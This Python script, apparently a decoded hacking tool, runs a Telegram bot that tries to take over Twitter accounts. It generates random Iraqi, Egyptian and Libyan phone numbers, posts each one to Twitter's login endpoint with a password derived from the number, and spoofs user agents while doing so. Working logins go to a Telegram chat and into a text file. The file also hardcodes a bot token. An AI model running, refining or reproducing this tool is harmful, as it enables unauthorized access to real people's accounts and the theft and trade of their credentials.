# encoding: utf-8
# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
BGS = '\n\x1b[1;31m          BEGASOS *---H\n\x1b[1;33m          GASOS   *----A\n\x1b[2;36m          SSOS    *----K\n\x1b[2;32m          OS     *-----E\n\x1b[1;31m          SS  *------R\n   My-@RX999      *********\n\x1b[1;33m =====================================\n\n __  __       _ _  Faking-Tools-Begasos\n|  \\/  | __ _(_) |  Bega   ___ ___  _ __ ___  \n\n      ----------------------- 𝑩𝑬𝑮𝑨𝑺𝑶𝑺 ---------------------                                                 _/﹋        -------- BEGASOS\n (҂`_´)\n   <,︻╦╤─ ҉ - - -BGASOS\n_/﹋\\_\n                     @RX999\n                                🇮🇶ALi-ajb        \n \n\x1b[1;33m ======================================\n\x1b[1;37m [~]\x1b[1;35mBEGASOS\x1b[1;33m'
print(BGS)
import os, webbrowser, random, requests, user_agent, mechanize, json, time
try:
    import telebot
except:
    os.system('pip install pyTelegramBotAPI')
    import telebot

from user_agent import generate_user_agent
from telebot import types

# التوكن مدمج بشكل دائم كما طلب المستخدم
tok = "8760690581:AAHZBkXK_ieuSfMaSKk04FcuAnRqceDBknc"
bot = telebot.TeleBot(tok)
bot.remove_webhook()

print('')
print('[=] o-اكتب الان في البوت -o[/start ]  ')

check = types.InlineKeyboardButton(text='- Start Hack By Begasos', callback_data='check')
ch = types.InlineKeyboardButton(text='- BoT BY BGS', url='t.me/Begasos1')

@bot.message_handler(commands=['start'])
def start(message):
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(check, ch)
    bot.send_message((message.chat.id), text='\n    that bot me begasos \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nAm tool hacke twitter bo 3 wlat \n\n\nBY : @Begasos1\n    ', parse_mode='html', reply_to_message_id=(message.message_id), reply_markup=maac)

@bot.callback_query_handler(func=(lambda call: True))
def qwere(call):
    if call.data == 'check':
        countres(call.message)
    if call.data == 'iraq':
        iraq(call.message)
    if call.data == 'Egypt':
        egypt(call.message)
    if call.data == 'Libya':
        libya(call.message)

cb = types.InlineKeyboardButton(text='[B] Iraq 🇮🇶', callback_data='iraq')
kaero = types.InlineKeyboardButton(text='[G] Egypt 🇪🇬', callback_data='Egypt')
cb2 = types.InlineKeyboardButton(text='[S] Libya 🇱🇾', callback_data='Libya')

def countres(message):
    can = types.InlineKeyboardMarkup()
    can.row_width = 1
    can.add(cb, kaero, cb2, ch)
    bot.edit_message_text(chat_id=(message.chat.id), message_id=(message.message_id), text='iH me BGS 🌹 ', reply_markup=can)

def iraq(message):
    bad = 0
    available = 0
    a7rf = '0192837465'
    nu = ['78', '77', '75', '75']
    while True:
        num = str(''.join((random.choice(nu) for i in range(1))))
        numbers = str(''.join((random.choice(a7rf) for i in range(7))))
        pn = '964' + num + '0' + numbers
        pas = '0' + num + '0' + numbers
        headers = {
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding':'gzip, deflate, br', 
            'Accept-Language':'ar,en-US;q=0.7,en;q=0.3', 
            'Content-Type':'application/x-www-form-urlencoded', 
            'User-Agent':generate_user_agent()
        }
        datta = {
            'session[username_or_email]':pn, 
            'session[password]':pas
        }
        url = 'https://twitter.com/sessions'
        try:
            rq = requests.post(url, headers=headers, data=datta, timeout=10)
            if 'ct0' in rq.cookies:
                available += 1
                bot.send_message(message.chat.id, f"\nTwitter GOOD \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n😎┇Email ~⪼ {pn}\n😷┇Pass ~⪼ {pas}\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n👨\u200d💻┇@Begasos1")
                with open('Tw_OK.txt', 'a') as M:
                    M.write(pn + ':' + pas + '\n')
            else:
                bad += 1
                iraq_ch(message, available, bad, pn)
        except:
            time.sleep(1)

def iraq_ch(message, available, bad, pn):
    aac = types.InlineKeyboardMarkup()
    aac.row_width = 2
    i1 = types.InlineKeyboardButton(text='[+] GOOD', callback_data='i1')
    i1_2 = types.InlineKeyboardButton(text=str(available), callback_data='i12')
    i2 = types.InlineKeyboardButton(text='[+] BAD', callback_data='i2')
    i2_2 = types.InlineKeyboardButton(text=str(bad), callback_data='i22')
    i3 = types.InlineKeyboardButton(text='[+] Number', callback_data='i3')
    i3_2 = types.InlineKeyboardButton(text=str(pn), callback_data='i32')
    aac.add(i1, i1_2, i2, i2_2, i3, i3_2)
    try:
        bot.edit_message_text(chat_id=(message.chat.id), message_id=(message.message_id), text='\nWait Check. In Twitter✅\nfree tools BGS \n@Begasos1\n', reply_markup=aac)
    except:
        pass

def libya(message):
    bad = 0
    available = 0
    a7rf = '0192837465'
    nu = ['92', '94', '91']
    while True:
        num = str(''.join((random.choice(nu) for i in range(1))))
        numbers = str(''.join((random.choice(a7rf) for i in range(7))))
        pnsn = '218' + num + numbers
        ps = '0' + num + numbers
        headers = {'User-Agent':generate_user_agent()}
        data = {'session[username_or_email]':pnsn, 'session[password]':ps}
        url = 'https://twitter.com/sessions'
        try:
            req = requests.post(url, headers=headers, data=data, timeout=10)
            if 'ct0' in req.cookies:
                available += 1
                bot.send_message(message.chat.id, f"\nTwitter GOOD \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n😎┇Email ~⪼ {pnsn}\n😷┇Pass ~⪼ {ps}\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n👨\u200d💻┇@Begasos1")
                with open('Tw_OK.txt', 'a') as M:
                    M.write(pnsn + ':' + ps + '\n')
            else:
                bad += 1
                libya_ch(message, available, bad, pnsn)
        except:
            time.sleep(1)

def libya_ch(message, available, bad, pnsn):
    aac = types.InlineKeyboardMarkup()
    aac.row_width = 2
    i1 = types.InlineKeyboardButton(text='[+] GOOD', callback_data='i1')
    i1_2 = types.InlineKeyboardButton(text=str(available), callback_data='i12')
    i2 = types.InlineKeyboardButton(text='[+] BAD', callback_data='i2')
    i2_2 = types.InlineKeyboardButton(text=str(bad), callback_data='i22')
    i3 = types.InlineKeyboardButton(text='[+] Number', callback_data='i3')
    i3_2 = types.InlineKeyboardButton(text=str(pnsn), callback_data='i32')
    aac.add(i1, i1_2, i2, i2_2, i3, i3_2)
    try:
        bot.edit_message_text(chat_id=(message.chat.id), message_id=(message.message_id), text='\nWait Check. In Twitter✅\nTOOL BY BGS\n@Begasos1\n', reply_markup=aac)
    except:
        pass

def egypt(message):
    bad = 0
    available = 0
    a7rf = '0192837465'
    nu = ['11', '10']
    while True:
        num = str(''.join((random.choice(nu) for i in range(1))))
        numbers = str(''.join((random.choice(a7rf) for i in range(7))))
        pnn = '20' + num + '1' + numbers
        pa = '0' + num + '1' + numbers
        headers = {'User-Agent':generate_user_agent()}
        datas = {'session[username_or_email]':pnn, 'session[password]':pa}
        url = 'https://twitter.com/sessions'
        try:
            eq = requests.post(url, headers=headers, data=datas, timeout=10)
            if 'ct0' in eq.cookies:
                available += 1
                bot.send_message(message.chat.id, f"\nTwitter GOOD \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n😎┇Email ~⪼ {pnn}\n😷┇Pass ~⪼ {pa}\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n👨\u200d💻┇@Begasos1")
                with open('Tw_OK.txt', 'a') as M:
                    M.write(pnn + ':' + pa + '\n')
            else:
                bad += 1
                egypt_ch(message, available, bad, pnn)
        except:
            time.sleep(1)

def egypt_ch(message, available, bad, pnn):
    aac = types.InlineKeyboardMarkup()
    aac.row_width = 2
    i1 = types.InlineKeyboardButton(text='[+] GOOD', callback_data='i1')
    i1_2 = types.InlineKeyboardButton(text=str(available), callback_data='i12')
    i2 = types.InlineKeyboardButton(text='[+] BAD', callback_data='i2')
    i2_2 = types.InlineKeyboardButton(text=str(bad), callback_data='i22')
    i3 = types.InlineKeyboardButton(text='[+] Number', callback_data='i3')
    i3_2 = types.InlineKeyboardButton(text=str(pnn), callback_data='i32')
    aac.add(i1, i1_2, i2, i2_2, i3, i3_2)
    try:
        bot.edit_message_text(chat_id=(message.chat.id), message_id=(message.message_id), text='\nWait Check. In Twitter✅\nfree tools BGS \n@Begasos1\n', reply_markup=aac)
    except:
        pass

if __name__ == '__main__':
    print("البوت يعمل الآن بالتوكن المدمج...")
    bot.polling(none_stop=True)
